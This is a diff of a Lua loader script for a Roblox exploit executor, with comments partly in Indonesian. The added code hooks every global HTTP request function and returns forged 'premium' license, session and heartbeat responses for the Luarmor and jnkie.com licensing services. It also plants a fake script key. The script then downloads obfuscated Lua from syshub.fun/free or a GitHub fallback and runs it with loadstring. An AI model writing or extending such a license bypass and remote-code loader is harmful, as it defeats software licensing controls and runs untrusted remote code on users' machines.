@@ -1,5 +1,7 @@
 -- ============================================================
--- exec_payload.lua (Updated)
+-- exec_payload.lua (Updated v2)
+-- Inject Luarmor bypass DULU, baru execute syshub.fun/free
+--
 -- Primary: syshub.fun/free (Luraph v14.8 raw Lua)
 -- Fallback: Galangpratama-rox JSON-wrapped payload
 --
@@ -7,12 +9,142 @@
 -- loadstring(game:HttpGet("https://raw.githubusercontent.com/ZoraRox/SAE-SYS/refs/heads/main/lua/exec_payload.lua"))()
 -- ============================================================
 
--- ── HTTP helper ──────────────────────────────────────────────
+if not game:IsLoaded() then game.Loaded:Wait() end
+task.wait(0.1)
+
+local ge = getgenv and getgenv() or {}
+local cenv = getfenv and getfenv(1) or _ENV or {}
+
+-- ══════════════════════════════════════════════════════════════
+-- STEP 1: INJECT LUARMOR / JNKIE BYPASS (fakeReq)
+-- ══════════════════════════════════════════════════════════════
+do
+    local native_http_request = rawget(ge, "http_request")
+    local native_request      = rawget(ge, "request")
+    local native_syn_request  = (syn and rawget(syn, "request")) or nil
+    local native_httprequest  = rawget(ge, "httprequest")
+    local native_syn_ref      = syn
+
+    local function jsonEncode(t)
+        local ok, hs = pcall(function() return game:GetService("HttpService") end)
+        if ok and hs then
+            local ok2, r = pcall(function() return hs:JSONEncode(t) end)
+            if ok2 then return r end
+        end
+        return "{}"
+    end
+
+    local function fakeRes(body)
+        return { StatusCode = 200, Status = 200, Body = body,
+                 Headers = { ["Content-Type"] = "application/json" } }
+    end
+
+    local function buildFakeReq(origReq)
+        return function(opts)
+            local url = type(opts) == "table"
+                and tostring(opts.Url or opts.url or "") or tostring(opts or "")
+            local u = url:lower()
+
+            -- Intercept luarmor.net dan jnkie.com
+            if u:find("luarmor%.net") or u:find("jnkie%.com") then
+                local sid  = "bf-" .. tostring(math.random(1e6, 9e6))
+                local stok = "bf-tok-" .. tostring(math.random(1e6, 9e6))
+
+                if u:find("check") or u:find("auth") or u:find("access") or u:find("validate") then
+                    return fakeRes(jsonEncode({
+                        status = "success", success = true, valid = true, authorized = true,
+                        message = "OK",
+                        data = {
+                            mode = "public_maintenance",
+                            accessTier = "premium", licenseType = "premium",
+                            sessionId = sid, sessionToken = stok,
+                            nextHeartbeatSeconds = 999999,
+                            continuityCredential = "bf-bypass"
+                        }
+                    }))
+                end
+                if u:find("heartbeat") then
+                    return fakeRes(jsonEncode({ status = "success", state = "active", success = true }))
+                end
+                if u:find("challenge") then
+                    return fakeRes(jsonEncode({
+                        status = "success",
+                        transportKey = string.rep("61", 32),
+                        challengeId = "bf-chal-" .. sid,
+                        success = true
+                    }))
+                end
+                if u:find("maintenance") or u:find("session") or u:find("login") then
+                    return fakeRes(jsonEncode({
+                        status = "success", success = true,
+                        session = {
+                            sessionId = sid, sessionToken = stok,
+                            nextHeartbeatSeconds = 999999,
+                            accessTier = "premium", licenseType = "premium"
+                        },
+                        continuityCredential = "bf-bypass",
+                        accessTier = "premium", licenseType = "premium"
+                    }))
+                end
+                return fakeRes(jsonEncode({ status = "success", success = true, message = "Bypassed" }))
+            end
+
+            -- Non-luarmor URL: forward ke original request
+            if type(origReq) == "function" then return origReq(opts) end
+            return { StatusCode = 0, Status = 0, Body = "" }
+        end
+    end
+
+    local function pickNative()
+        if type(native_http_request) == "function" then return native_http_request end
+        if type(native_request)      == "function" then return native_request end
+        if type(native_syn_request)  == "function" then return native_syn_request end
+        if type(native_httprequest)  == "function" then return native_httprequest end
+        return nil
+    end
+
+    local native  = pickNative()
+    local fakeReq = buildFakeReq(native)
+
+    -- Inject ke semua global HTTP functions
+    rawset(ge, "request", fakeReq)
+    rawset(ge, "http_request", fakeReq)
+    rawset(ge, "httprequest", fakeReq)
+    rawset(ge, "__BFBypassReq", fakeReq)
+    rawset(ge, "__BigFrootBypassActive", true)
+
+    if native_syn_ref and type(native_syn_ref) == "table" then
+        rawset(native_syn_ref, "request", fakeReq)
+    end
+
+    _G.request = fakeReq
+    _G.http_request = fakeReq
+    if cenv and cenv ~= ge and cenv ~= _G then
+        pcall(function() rawset(cenv, "request", fakeReq) end)
+        pcall(function() rawset(cenv, "http_request", fakeReq) end)
+    end
+
+    -- Set default script_key
+    local defaultKey = "BF-BYPASS-KEY-" .. tostring(math.random(1e5, 9e5))
+    ge.script_key = defaultKey
+    ge.SCRIPT_KEY = defaultKey
+    _G.script_key = defaultKey
+    _G.SCRIPT_KEY = defaultKey
+
+    print("[exec] Bypass injected (luarmor.net, jnkie.com)")
+    print("[exec] Default script_key: " .. defaultKey)
+end
+
+-- ══════════════════════════════════════════════════════════════
+-- STEP 2: HTTP HELPER (pakai game:HttpGet native, bukan fakeReq)
+-- ══════════════════════════════════════════════════════════════
+local _nativeHttpGet = game.HttpGet
+
 local function httpGet(u)
-    -- coba game:HttpGet dulu (paling universal)
-    local ok, r = pcall(game.HttpGet, game, u, true)
+    local ok, r = pcall(_nativeHttpGet, game, u, true)
     if ok and type(r) == "string" and #r > 0 then return r end
-    -- fallback: request functions
+    -- Fallback: request functions (sudah di-wrap fakeReq,
+    -- tapi untuk non-luarmor URL akan forward ke origReq)
     if syn and syn.request then
         local ok2, r2 = pcall(function() return syn.request({Url=u, Method="GET"}) end)
         if ok2 and r2 and r2.Body and #r2.Body > 0 then return r2.Body end
@@ -28,7 +160,11 @@ local function httpGet(u)
     return nil
 end
 
--- ── Hapus cache lama yang sudah broken ───────────────────────
+-- ══════════════════════════════════════════════════════════════
+-- STEP 3: HAPUS CACHE LAMA & DOWNLOAD PAYLOAD
+-- ══════════════════════════════════════════════════════════════
+
+-- Hapus cache lama yang broken
 if isfile and delfile then
     if isfile("syshub_intercept_2.lua") then
         pcall(delfile, "syshub_intercept_2.lua")
@@ -36,7 +172,6 @@ if isfile and delfile then
     end
 end
 
--- ── Download payload ─────────────────────────────────────────
 local CACHE_FILE = "syshub_payload_v2.lua"
 local PRIMARY_URL = "https://syshub.fun/free"
 local FALLBACK_URL = "https://raw.githubusercontent.com/Galangpratama-rox/Decode-Sys/main/lua/syshub_payload.lua"
@@ -48,7 +183,7 @@ local source = "unknown"
 if isfile and isfile(CACHE_FILE) then
     raw = readfile(CACHE_FILE)
     source = "local cache"
-    print("[exec] Loaded from local cache: " .. CACHE_FILE .. " (" .. #raw .. " bytes)")
+    print("[exec] Loaded from cache: " .. CACHE_FILE .. " (" .. #raw .. " bytes)")
 end
 
 -- 2) Coba dari syshub.fun/free (primary)
@@ -58,7 +193,6 @@ if not raw or #raw < 100 then
     if raw and #raw > 100 then
         source = "syshub.fun/free"
         print("[exec] Downloaded from syshub.fun/free: " .. #raw .. " bytes")
-        -- cache untuk next time
         if writefile then
             pcall(writefile, CACHE_FILE, raw)
             print("[exec] Cached to: " .. CACHE_FILE)
@@ -87,10 +221,11 @@ end
 print("[exec] Source: " .. source)
 print("[exec] raw len: " .. #raw)
 
--- ── Auto-detect format & extract script ──────────────────────
+-- ══════════════════════════════════════════════════════════════
+-- STEP 4: AUTO-DETECT FORMAT & EXTRACT SCRIPT
+-- ══════════════════════════════════════════════════════════════
 local script = nil
 
--- Cek apakah JSON wrapped (dimulai dengan { dan ada field "script")
 local jsonStart = raw:find('{"', 1, true) or raw:find('{ "', 1, true)
 local hasScriptField = raw:find('"script"', 1, true)
 
@@ -100,7 +235,7 @@ if jsonStart and hasScriptField then
     local s = raw:find('"script":"', 1, true)
     if not s then
         s = raw:find('"script" : "', 1, true)
-        if s then s = s + 2 end -- adjust offset
+        if s then s = s + 2 end
     end
     if not s then error("[exec] field 'script' tidak ditemukan di JSON") end
 
@@ -153,14 +288,16 @@ if jsonStart and hasScriptField then
     script = table.concat(result)
     print("[exec] Extracted script: " .. #script .. " chars")
 else
-    -- Format: Raw Lua script (syshub.fun/free returns ini)
+    -- Format: Raw Lua script (syshub.fun/free)
     print("[exec] Format: raw Lua script")
     script = raw
 end
 
 print("[exec] script len: " .. #script)
 
--- ── Loadstring & Execute ─────────────────────────────────────
+-- ══════════════════════════════════════════════════════════════
+-- STEP 5: LOADSTRING & EXECUTE
+-- ══════════════════════════════════════════════════════════════
 local fn, err = loadstring(script)
 if not fn then
     local errmsg = tostring(err or "unknown error")
@@ -178,7 +315,7 @@ if not fn then
     error("[exec] loadstring gagal: " .. errmsg)
 end
 
-print("[exec] Executing payload...")
+print("[exec] Executing payload (bypass active)...")
 local ok, runerr = pcall(fn)
 if not ok then
     error("[exec] Runtime error: " .. tostring(runerr))
